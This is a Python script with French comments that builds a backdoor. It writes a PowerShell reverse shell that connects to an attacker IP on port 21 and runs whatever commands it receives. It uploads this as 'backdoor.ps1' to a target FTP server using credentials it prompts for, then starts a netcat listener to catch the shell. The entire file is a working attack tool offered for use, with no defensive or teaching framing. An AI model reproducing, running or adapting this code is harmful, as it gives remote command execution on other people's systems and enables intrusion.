import ftplib
import subprocess
import os
import tempfile

def create_powershell_script():
    """Crée le script PowerShell pour le reverse shell."""
    powershell_script = """
    $client = New-Object System.Net.Sockets.TCPClient('192.168.146.136',21); # IP de l'attaquant et port d'écoute
    $stream = $client.GetStream();
    [byte[]]$buffer = 0..65535|%{0};
    while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
        $sendback = iex $data 2>&1 | Out-String;
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    };
    $client.Close();
    """
    return powershell_script

def deploy_backdoor(ftp_server, username, password, powershell_script, remote_file_path):
    """Déploie la backdoor sur le serveur cible via FTP."""
    try:
        with ftplib.FTP(ftp_server) as ftp:
            ftp.login(username, password)
            with tempfile.NamedTemporaryFile(delete=False, mode='w') as temp_file:
                temp_file.write(powershell_script)
                temp_file_path = temp_file.name
            with open(temp_file_path, 'rb') as file:
                ftp.storbinary(f'STOR {remote_file_path}', file)
            os.unlink(temp_file_path)  # Supprimer le fichier temporaire
        print("Backdoor deployed successfully.")
    except Exception as e:
        print(f"Failed to deploy backdoor: {e}")
        return False
    return True

def start_listener(port):
    """Démarre un écouteur Netcat sur le port spécifié."""
    try:
        subprocess.run(['nc', '-lvnp', str(port)])
    except KeyboardInterrupt:
        print("Listener stopped manually.")
    except Exception as e:
        print(f"Error while listening: {e}")

def reverse_shell():
    ftp_server = input("Enter the FTP server IP: ")
    username = input("Enter the FTP username: ")
    password = input("Enter the FTP password: ")
    
    # Définir le chemin de déploiement de la backdoor à la racine de la connexion FTP
    remote_file_path = "backdoor.ps1"  # Nom du fichier à la racine du FTP

    listener_port = input("Enter the port to listen on for reverse shell: ")

    # Script PowerShell encapsulé
    powershell_script = create_powershell_script()

    if deploy_backdoor(ftp_server, username, password, powershell_script, remote_file_path):
        print("Starting listener for reverse shell...")
        start_listener(listener_port)
    else:
        print("Failed to deploy the backdoor. Listener will not start.")

if __name__ == "__main__":
    reverse_shell()
